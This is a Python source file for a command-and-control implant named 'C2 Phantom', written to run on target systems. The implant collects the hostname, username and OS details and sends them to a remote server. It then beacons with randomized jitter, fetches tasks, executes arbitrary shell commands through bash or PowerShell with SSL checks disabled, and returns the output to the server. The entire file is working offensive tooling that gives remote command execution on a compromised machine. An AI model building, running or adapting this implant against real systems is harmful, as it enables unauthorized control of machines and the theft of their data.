"""
C2 Agent/Implant for C2 Phantom.

This is the agent that runs on target systems and communicates with the C2 server.
"""

import asyncio
import json
import platform
import subprocess
import sys
from typing import Dict, Any, Optional
from datetime import datetime
import getpass
import socket

import aiohttp


class C2Agent:
    """
    C2 Agent that runs on target system.
    
    Registers with C2 server, receives commands, executes them, and returns results.
    """

    def __init__(self, c2_server_url: str, beacon_interval: int = 60, jitter: int = 30) -> None:
        """
        Initialize C2 agent.
        
        Args:
            c2_server_url: C2 server URL
            beacon_interval: Beacon interval in seconds
            jitter: Random jitter to add to beacon interval
        """
        self.c2_server_url = c2_server_url.rstrip("/")
        self.beacon_interval = beacon_interval
        self.jitter = jitter
        self.session_id: Optional[str] = None
        self.encryption_key: Optional[str] = None
        self.running = False

    async def register(self) -> bool:
        """
        Register with C2 server.
        
        Returns:
            True if registration successful
        """
        try:
            # Gather system information
            system_info = {
                "hostname": socket.gethostname(),
                "username": getpass.getuser(),
                "os": platform.system(),
                "os_version": platform.version(),
                "architecture": platform.machine(),
                "python_version": sys.version.split()[0]
            }

            async with aiohttp.ClientSession() as session:
                async with session.post(
                    f"{self.c2_server_url}/register",
                    json=system_info,
                    ssl=False  # For testing; use proper SSL in production
                ) as response:
                    if response.status == 200:
                        data = await response.json()
                        self.session_id = data["session_id"]
                        self.encryption_key = data.get("encryption_key")
                        self.beacon_interval = data.get("beacon_interval", self.beacon_interval)
                        self.jitter = data.get("jitter", self.jitter)
                        
                        print(f"[+] Registered with C2 server, session ID: {self.session_id}")
                        return True
                    else:
                        print(f"[-] Registration failed: {response.status}")
                        return False

        except Exception as e:
            print(f"[-] Registration error: {e}")
            return False

    async def beacon(self) -> Dict[str, Any]:
        """
        Send beacon to C2 server.
        
        Returns:
            Beacon response data
        """
        try:
            async with aiohttp.ClientSession() as session:
                async with session.post(
                    f"{self.c2_server_url}/beacon",
                    json={"session_id": self.session_id},
                    ssl=False
                ) as response:
                    if response.status == 200:
                        return await response.json()
                    else:
                        print(f"[-] Beacon failed: {response.status}")
                        return {}

        except Exception as e:
            print(f"[-] Beacon error: {e}")
            return {}

    async def get_tasks(self) -> list:
        """
        Retrieve tasks from C2 server.
        
        Returns:
            List of tasks to execute
        """
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(
                    f"{self.c2_server_url}/tasks/{self.session_id}",
                    ssl=False
                ) as response:
                    if response.status == 200:
                        data = await response.json()
                        return data.get("tasks", [])
                    else:
                        return []

        except Exception as e:
            print(f"[-] Get tasks error: {e}")
            return []

    async def execute_command(self, command: str) -> Dict[str, Any]:
        """
        Execute a shell command.
        
        Args:
            command: Command to execute
            
        Returns:
            Execution result
        """
        try:
            # Determine shell based on platform
            if platform.system() == "Windows":
                shell_cmd = ["powershell.exe", "-Command", command]
            else:
                shell_cmd = ["/bin/bash", "-c", command]

            # Execute command
            process = subprocess.Popen(
                shell_cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            
            stdout, stderr = process.communicate(timeout=300)  # 5 minute timeout
            
            return {
                "output": stdout,
                "error": stderr,
                "exit_code": process.returncode,
                "timestamp": datetime.now().isoformat()
            }

        except subprocess.TimeoutExpired:
            process.kill()
            return {
                "output": "",
                "error": "Command timed out after 5 minutes",
                "exit_code": -1,
                "timestamp": datetime.now().isoformat()
            }
        except Exception as e:
            return {
                "output": "",
                "error": str(e),
                "exit_code": -1,
                "timestamp": datetime.now().isoformat()
            }

    async def post_results(self, task_id: str, results: Dict[str, Any]) -> bool:
        """
        Post command results back to C2 server.
        
        Args:
            task_id: Task ID
            results: Execution results
            
        Returns:
            True if successful
        """
        try:
            data = {
                "task_id": task_id,
                **results
            }

            async with aiohttp.ClientSession() as session:
                async with session.post(
                    f"{self.c2_server_url}/results/{self.session_id}",
                    json=data,
                    ssl=False
                ) as response:
                    return response.status == 200

        except Exception as e:
            print(f"[-] Post results error: {e}")
            return False

    async def process_task(self, task: Dict[str, Any]) -> None:
        """
        Process a single task.
        
        Args:
            task: Task to process
        """
        task_id = task.get("id")
        task_type = task.get("type")
        
        print(f"[*] Processing task {task_id}: {task_type}")
        
        if task_type == "execute":
            command = task.get("command")
            if command:
                print(f"[*] Executing: {command}")
                results = await self.execute_command(command)
                await self.post_results(task_id, results)
                print(f"[+] Task {task_id} completed")
        
        elif task_type == "upload":
            # Handle file upload
            print(f"[!] Upload not yet implemented")
        
        elif task_type == "download":
            # Handle file download
            print(f"[!] Download not yet implemented")
        
        else:
            print(f"[!] Unknown task type: {task_type}")

    async def run(self) -> None:
        """
        Main agent loop.
        
        Continuously beacons to C2 server, retrieves tasks, and executes them.
        """
        # Register with C2 server
        if not await self.register():
            print("[-] Failed to register with C2 server")
            return

        self.running = True
        print(f"[+] Agent started (beacon interval: {self.beacon_interval}s, jitter: {self.jitter}s)")

        while self.running:
            try:
                # Send beacon
                beacon_response = await self.beacon()
                
                # Check if there are tasks
                if beacon_response.get("has_tasks"):
                    tasks = await self.get_tasks()
                    
                    for task in tasks:
                        await self.process_task(task)
                
                # Sleep with jitter
                import random
                sleep_time = self.beacon_interval + random.randint(-self.jitter, self.jitter)
                sleep_time = max(10, sleep_time)  # Minimum 10 seconds
                
                await asyncio.sleep(sleep_time)

            except KeyboardInterrupt:
                print("\n[*] Agent stopped by user")
                self.running = False
                break
            except Exception as e:
                print(f"[-] Agent error: {e}")
                await asyncio.sleep(self.beacon_interval)

    def stop(self) -> None:
        """Stop the agent."""
        self.running = False


def main():
    """Main entry point for agent."""
    import argparse
    
    parser = argparse.ArgumentParser(description="C2 Phantom Agent")
    parser.add_argument("--server", required=True, help="C2 server URL (e.g., http://localhost:8443)")
    parser.add_argument("--beacon", type=int, default=60, help="Beacon interval in seconds")
    parser.add_argument("--jitter", type=int, default=30, help="Beacon jitter in seconds")
    
    args = parser.parse_args()
    
    agent = C2Agent(args.server, args.beacon, args.jitter)
    
    try:
        asyncio.run(agent.run())
    except KeyboardInterrupt:
        print("\n[*] Agent stopped")


if __name__ == "__main__":
    main()
